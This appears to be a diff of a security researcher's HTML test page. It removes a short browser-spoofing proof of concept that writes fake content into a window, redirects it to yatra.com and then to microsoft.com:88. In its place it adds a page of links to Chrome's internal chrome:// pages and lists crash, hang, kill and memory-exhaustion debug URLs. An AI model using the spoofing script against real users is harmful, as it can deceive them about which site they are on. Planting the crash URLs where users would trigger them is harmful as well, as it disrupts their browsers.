@@ -1,18 +1,171 @@
-<html>
- <head>
-  <script>
-  function next() {
-         w.location.replace('https://microsoft.com:88');
-        }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chrome:// URLs PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    h2 { margin-top: 30px; color: #2c3e50; }
+    .danger { color: red; font-weight: bold; }
+    .disabled { color: gray; text-decoration: line-through; }
+    a { display: block; margin: 2px 0; }
+  </style>
+</head>
+<body>
+  <h1>Chrome:// URLs PoC</h1>
+  <p>⚠️ Some links may crash, restart, or hang Chrome. Use in a safe environment.</p>
 
-  function f() {
-    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://yatra.com'");
+  <h2>✅ General & Safe Chrome Pages</h2>
+  <a href="chrome://about">about</a>
+  <a href="chrome://access-code-cast">access-code-cast</a>
+  <a href="chrome://accessibility">accessibility</a>
+  <a href="chrome://app-service-internals">app-service-internals</a>
+  <a href="chrome://app-settings">app-settings</a>
+  <a href="chrome://apps">apps</a>
+  <a href="chrome://attribution-internals">attribution-internals</a>
+  <a href="chrome://autofill-internals">autofill-internals</a>
+  <a href="chrome://batch-upload">batch-upload</a>
+  <a href="chrome://blob-internals">blob-internals</a>
+  <a href="chrome://bluetooth-internals">bluetooth-internals</a>
+  <a href="chrome://bookmarks">bookmarks</a>
+  <a href="chrome://bookmarks-side-panel.top-chrome">bookmarks-side-panel</a>
+  <a href="chrome://browser-switch">browser-switch</a>
+  <a href="chrome://cast-feedback">cast-feedback</a>
+  <a href="chrome://certificate-manager">certificate-manager</a>
+  <a href="chrome://chrome">chrome</a>
+  <a href="chrome://chrome-signin">chrome-signin</a>
+  <a href="chrome://chrome-urls">chrome-urls</a>
+  <a href="chrome://compare">compare</a>
+  <a href="chrome://components">components</a>
+  <a href="chrome://conflicts">conflicts</a>
+  <a href="chrome://connection-help">connection-help</a>
+  <a href="chrome://connection-monitoring-detected">connection-monitoring-detected</a>
+  <a href="chrome://connectors-internals">connectors-internals</a>
+  <a href="chrome://crashes">crashes</a>
+  <a href="chrome://credits">credits</a>
+  <a href="chrome://customize-chrome-side-panel.top-chrome">customize-chrome-side-panel</a>
+  <a href="chrome://device-log">device-log</a>
+  <a href="chrome://dino">dino</a>
+  <a href="chrome://downloads">downloads</a>
+  <a href="chrome://extensions">extensions</a>
+  <a href="chrome://extensions-internals">extensions-internals</a>
+  <a href="chrome://extensions-zero-state">extensions-zero-state</a>
+  <a href="chrome://feedback">feedback</a>
+  <a href="chrome://flags">flags</a>
+  <a href="chrome://gcm-internals">gcm-internals</a>
+  <a href="chrome://gpu">gpu</a>
+  <a href="chrome://histograms">histograms</a>
+  <a href="chrome://history">history</a>
+  <a href="chrome://history-clusters-side-panel.top-chrome">history-clusters-side-panel</a>
+  <a href="chrome://history-side-panel.top-chrome">history-side-panel</a>
+  <a href="chrome://history-sync-optin">history-sync-optin</a>
+  <a href="chrome://indexeddb-internals">indexeddb-internals</a>
+  <a href="chrome://inspect">inspect</a>
+  <a href="chrome://internals">internals</a>
+  <a href="chrome://intro">intro</a>
+  <a href="chrome://managed-user-profile-notice">managed-user-profile-notice</a>
+  <a href="chrome://management">management</a>
+  <a href="chrome://media-engagement">media-engagement</a>
+  <a href="chrome://media-internals">media-internals</a>
+  <a href="chrome://metrics-internals">metrics-internals</a>
+  <a href="chrome://net-export">net-export</a>
+  <a href="chrome://net-internals">net-internals</a>
+  <a href="chrome://new-tab-page">new-tab-page</a>
+  <a href="chrome://new-tab-page-third-party">new-tab-page-third-party</a>
+  <a href="chrome://newtab">newtab</a>
+  <a href="chrome://ntp-tiles-internals">ntp-tiles-internals</a>
+  <a href="chrome://omnibox-popup.top-chrome">omnibox-popup</a>
+  <a href="chrome://on-device-translation-internals">on-device-translation-internals</a>
+  <a href="chrome://password-manager">password-manager</a>
+  <a href="chrome://password-manager-internals">password-manager-internals</a>
+  <a href="chrome://policy">policy</a>
+  <a href="chrome://predictors">predictors</a>
+  <a href="chrome://print">print</a>
+  <a href="chrome://privacy-sandbox-internals">privacy-sandbox-internals</a>
+  <a href="chrome://private-aggregation-internals">private-aggregation-internals</a>
+  <a href="chrome://process-internals">process-internals</a>
+  <a href="chrome://profile-customization">profile-customization</a>
+  <a href="chrome://profile-internals">profile-internals</a>
+  <a href="chrome://profile-picker">profile-picker</a>
+  <a href="chrome://quota-internals">quota-internals</a>
+  <a href="chrome://reset-password">reset-password</a>
+  <a href="chrome://sandbox">sandbox</a>
+  <a href="chrome://search-engine-choice">search-engine-choice</a>
+  <a href="chrome://segmentation-internals">segmentation-internals</a>
+  <a href="chrome://serviceworker-internals">serviceworker-internals</a>
+  <a href="chrome://settings">settings</a>
+  <a href="chrome://signin-email-confirmation">signin-email-confirmation</a>
+  <a href="chrome://signin-error">signin-error</a>
+  <a href="chrome://signin-internals">signin-internals</a>
+  <a href="chrome://signout-confirmation">signout-confirmation</a>
+  <a href="chrome://site-engagement">site-engagement</a>
+  <a href="chrome://suggest-internals">suggest-internals</a>
+  <a href="chrome://support-tool">support-tool</a>
+  <a href="chrome://sync-confirmation">sync-confirmation</a>
+  <a href="chrome://sync-internals">sync-internals</a>
+  <a href="chrome://system">system</a>
+  <a href="chrome://terms">terms</a>
+  <a href="chrome://topics-internals">topics-internals</a>
+  <a href="chrome://translate-internals">translate-internals</a>
+  <a href="chrome://usb-internals">usb-internals</a>
+  <a href="chrome://version">version</a>
+  <a href="chrome://view-cert">view-cert</a>
+  <a href="chrome://web-app-internals">web-app-internals</a>
+  <a href="chrome://webrtc-internals">webrtc-internals</a>
+  <a href="chrome://whats-new">whats-new</a>
 
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
-  }
-</script>
- </head>
- <body>
-  <center><a href="#" onclick="f()">Click For POC</a></center>
- </body>
+  <h2>🔎 Internals / Debugging Pages</h2>
+  <a href="chrome://actor-internals">actor-internals</a>
+  <a href="chrome://commerce-internals">commerce-internals</a>
+  <a href="chrome://data-sharing-internals">data-sharing-internals</a>
+  <a href="chrome://discards">discards</a>
+  <a href="chrome://download-internals">download-internals</a>
+  <a href="chrome://family-link-user-internals">family-link-user-internals</a>
+  <a href="chrome://history-clusters-internals">history-clusters-internals</a>
+  <a href="chrome://infobar-internals">infobar-internals</a>
+  <a href="chrome://interstitials">interstitials</a>
+  <a href="chrome://local-state">local-state</a>
+  <a href="chrome://location-internals">location-internals</a>
+  <a href="chrome://media-router-internals">media-router-internals</a>
+  <a href="chrome://memory-internals">memory-internals</a>
+  <a href="chrome://network-errors">network-errors</a>
+  <a href="chrome://omnibox">omnibox</a>
+  <a href="chrome://on-device-internals">on-device-internals</a>
+  <a href="chrome://optimization-guide-internals">optimization-guide-internals</a>
+  <a href="chrome://safe-browsing">safe-browsing</a>
+  <a href="chrome://traces">traces</a>
+  <a href="chrome://traces-internals">traces-internals</a>
+  <a href="chrome://tracing">tracing</a>
+  <a href="chrome://ukm">ukm</a>
+  <a href="chrome://user-actions">user-actions</a>
+  <a href="chrome://user-education-internals">user-education-internals</a>
+  <a href="chrome://webrtc-logs">webrtc-logs</a>
+  <a href="chrome://webui-gallery">webui-gallery</a>
+  <a href="chrome://webxr-internals">webxr-internals</a>
+
+  <h2 class="danger">☠️ Dangerous / Crash & Kill URLs</h2>
+  <p class="disabled">⚠️ These are listed only as text to avoid auto-crash. Copy & paste into Chrome manually if testing.</p>
+  <ul>
+    <li>chrome://badcastcrash</li>
+    <li>chrome://inducebrowsercrashforrealz</li>
+    <li>chrome://inducebrowserdcheckforrealz</li>
+    <li>chrome://crash</li>
+    <li>chrome://crash/rust</li>
+    <li>chrome://crashdump</li>
+    <li>chrome://kill</li>
+    <li>chrome://hang</li>
+    <li>chrome://shorthang</li>
+    <li>chrome://gpuclean</li>
+    <li>chrome://gpucrash</li>
+    <li>chrome://gpuhang</li>
+    <li>chrome://memory-exhaust</li>
+    <li>chrome://memory-pressure-critical</li>
+    <li>chrome://memory-pressure-moderate</li>
+    <li>chrome://inducebrowserheapcorruption</li>
+    <li>chrome://crash/cfg</li>
+    <li>chrome://heapcorruptioncrash</li>
+    <li>chrome://quit</li>
+    <li>chrome://restart</li>
+  </ul>
+</body>
 </html>
